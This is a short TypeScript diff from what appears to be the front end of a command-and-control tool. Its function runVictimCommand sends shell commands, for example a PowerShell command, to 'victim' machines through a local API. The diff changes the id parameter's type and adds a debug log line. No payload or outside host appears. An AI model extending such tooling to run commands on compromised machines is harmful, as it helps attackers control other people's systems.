@@ -86,11 +86,12 @@ export const getVictim = (id: string) => {
 };
 
 export const runVictimCommand = (
-  id: string,
+  id: number,
   command: string,
   type?: string
 ) => {
   // Encrypt the command in URL format
+  console.log("id", id, "command", command, "type", type);
   command = encodeURIComponent(command);
 
   // Example request: http://127.0.0.1:8001/api/v1/clients/119384632345157/command?command_type=powershell&command=pwd
